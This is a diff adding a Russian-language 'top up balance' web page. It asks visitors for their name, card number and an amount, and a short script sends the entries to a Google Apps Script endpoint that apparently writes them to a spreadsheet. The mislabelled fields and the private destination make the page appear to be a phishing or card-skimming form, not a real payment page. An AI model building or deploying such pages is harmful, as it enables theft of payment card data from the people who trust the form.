@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HTML Form to Google Sheets</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    
+<div class="container">
+    <form action="#" class="login-form" name="submit-to-google-sheet">
+
+        <h2>Пополнить баланс</h2>
+
+        <input type="text" name="Name" id="Name" autocomplete="off" placeholder="Введите Ваше имя" required>
+        
+        <input type="text" name="email" id="email" autocomplete="off" placeholder="Введите Ваш номер карты" required>
+
+        <input type="text" name="password" id="password" autocomplete="off" placeholder="Введите сумму пополнения" required>
+        
+        <button type="submit" style="font-size: 40px; display: flex; align-items: center; justify-content: center;">➢</button>
+    </form>
+</div>
+
+<script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbyfYlMK1aiKuzYV-MV3HPMw1QRonulY_BtbqCWnqblWisZ0RkN7_B8_sHyWeKCpGgxf/exec'
+    const form = document.forms['submit-to-google-sheet']
+  
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => console.log('Success!', response))
+        .catch(error => console.error('Error!', error.message))
+    })
+  </script>
+
+</body>
+</html>
